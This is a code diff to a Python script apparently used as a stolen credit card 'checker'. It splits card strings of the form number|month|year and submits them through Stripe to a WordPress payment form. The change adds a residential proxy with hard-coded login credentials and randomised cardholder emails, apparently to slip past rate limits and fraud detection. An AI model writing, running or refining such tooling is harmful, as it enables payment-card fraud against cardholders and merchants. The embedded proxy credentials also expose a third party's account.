@@ -1,6 +1,10 @@
 import requests,re
+import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
-	import requests
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -9,6 +13,9 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
+	
+	random_amount1 = random.randint(1, 9)
+	random_amount2 = random.randint(1, 99)
 
 	headers = {
 	    'authority': 'api.stripe.com',
@@ -58,7 +65,7 @@ def Tele(ccx):
 	        '',
 	        '',
 	    ],
-	    'wpfs-card-holder-email': 'rodamuser08@gmail.com',
+	    'wpfs-card-holder-email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
 	    'wpfs-card-holder-name': 'Dao Khao Saard',
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
